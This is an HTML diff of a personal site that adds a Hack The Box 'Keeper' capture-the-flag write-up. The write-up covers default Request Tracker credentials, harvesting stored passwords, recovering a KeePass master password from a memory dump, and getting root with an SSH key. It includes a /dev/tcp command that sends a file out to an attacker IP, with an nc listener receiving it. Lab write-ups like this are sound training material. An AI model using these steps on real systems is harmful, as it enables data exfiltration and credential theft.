@@ -3,7 +3,7 @@
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AS-REP Roasting | Xzos</title>
+  <title>HTB - Keeper | Xzos</title>
   <meta name="description" content="Penetration Tester &amp; Red Teamer" />
   <link rel="stylesheet" href="/css/style.css" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -25,51 +25,73 @@
 </header>
   <main>
     
-<section class="page-section">
-  <div class="section-inner">
-    <h1 class="page-title"><span class="prompt">#</span> AS-REP Roasting</h1>
-
-    
-
-    <div class="writeup-list">
+<article class="post-page">
+  <div class="post-inner">
+    <header class="post-header">
+      <div class="post-meta">
+        <span class="item-date">April 12, 2026</span>
+        <span class="card-platform htb">HTB</span>
+        <span class="card-difficulty easy">Easy</span>
+      </div>
+      <h1 class="post-title">HTB - Keeper</h1>
       
-      <article class="writeup-item" data-platform="htb">
-        <a href="http://localhost:1313/writeup/sauna/" class="writeup-item-link">
-          <div class="item-left">
-            <h2 class="item-title">HTB - Sauna</h2>
-            <p class="item-summary">Username enumeration and AS-REP Roasting to gain initial access, then privilege escalation via DCSync rights abuse.</p>
-            
-            <div class="card-tags">
-              <span class="tag">Active Directory</span><span class="tag">AS-REP Roasting</span><span class="tag">Username Anarchy</span><span class="tag">DCSync</span>
-            </div>
-            
-          </div>
-          <div class="item-right">
-            <span class="item-date">Mar 05, 2026</span>
-            <span class="card-platform htb">HTB</span>
-            <span class="card-difficulty easy">Easy</span>
-          </div>
-        </a>
-      </article>
+      <div class="card-tags">
+        <span class="tag">RequestTracker</span><span class="tag">Default Credentials</span><span class="tag">KeePass</span><span class="tag">SSH Key Recovery</span>
+      </div>
       
+    </header>
+    <div class="post-content">
+      <p><strong>Target IP:</strong> <code>10.129.13.99</code></p>
+<h2 id="enumeration">Enumeration</h2>
+<p><img src="1.png" alt="Nmap scan results"></p>
+<p>The scan reveals the following services:</p>
+<ul>
+<li>OpenSSH 8.9p1</li>
+<li>nginx 1.18.0</li>
+<li>Request Tracker 4.4.4+dfsg-2ubuntu1, accessible at <code>http://tickets.keeper.htb/rt/</code></li>
+</ul>
+<p><img src="2.png" alt="Request Tracker login page"></p>
+<p>The Request Tracker instance accepts the default credentials:</p>
+<ul>
+<li><strong>User:</strong> <code>root</code></li>
+<li><strong>Password:</strong> <code>password</code></li>
+</ul>
+<h2 id="foothold">Foothold</h2>
+<p>Browsing the user administration panel at <code>http://tickets.keeper.htb/rt/Admin/Users/</code> reveals stored user credentials.</p>
+<p><img src="3.png" alt="Admin users panel">
+<img src="4.png" alt="User credentials"></p>
+<p><strong>Credentials obtained:</strong></p>
+<ul>
+<li><strong>User:</strong> <code>lnorgaard</code></li>
+<li><strong>Password:</strong> <code>Welcome2023!</code></li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>A ticket attachment, <code>RT30000.zip</code>, is transferred from the target to the local machine for offline analysis:</p>
+<p>On the target:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat RT30000.zip &gt; /dev/tcp/10.10.14.133/9001
+</span></span></code></pre></div><p>On the attacking machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">9001</span> &gt; RT30000.zip
+</span></span></code></pre></div><p><img src="5.png" alt="Transferred archive contents"></p>
+<p>The archive contains a KeePass database file. Its hash is extracted for offline cracking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>keepass2john passcodes.kdbx &gt; keepasshash
+</span></span></code></pre></div><p>Standard wordlist attacks fail, so the <a href="https://github.com/vdohney/keepass-password-dumper">keepass-password-dumper</a> tool is used instead, which exploits a KeePass memory vulnerability to recover partial password fragments.</p>
+<p><img src="6.png" alt="KeePass password dumper output"></p>
+<p>This reveals a potential password: <code>dgrød med fløde</code>. Testing it directly fails, and <code>kpcli</code> confirms no match.</p>
+<p>A quick search clarifies the correct Danish spelling:</p>
+<p><img src="7.png" alt="Research on Danish phrase"></p>
+<p>Trying the corrected version succeeds:</p>
+<pre tabindex="0"><code>rødgrød med fløde
+</code></pre><p><img src="8.png" alt="Successful KeePass unlock"></p>
+<p>Inside the database is an SSH private key. It is converted to OpenSSH format and used to authenticate as root:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>puttygen ssh_key_file -O private-openssh -o id_rsa
+</span></span></code></pre></div><p>Connecting with the converted key grants a root shell and access to the final flag.</p>
+
     </div>
+    <footer class="post-footer">
+      <a href="/writeup/" class="btn btn-outline">← Back to Writeups</a>
+    </footer>
   </div>
-</section>
-
-<script>
-  const btns = document.querySelectorAll('.filter-btn');
-  const items = document.querySelectorAll('.writeup-item');
-  btns.forEach(btn => {
-    btn.addEventListener('click', () => {
-      btns.forEach(b => b.classList.remove('active'));
-      btn.classList.add('active');
-      const f = btn.dataset.filter;
-      items.forEach(item => {
-        item.style.display = (f === 'all' || item.dataset.platform === f) ? 'flex' : 'none';
-      });
-    });
-  });
-</script>
+</article>
 
   </main>
   <footer class="site-footer">
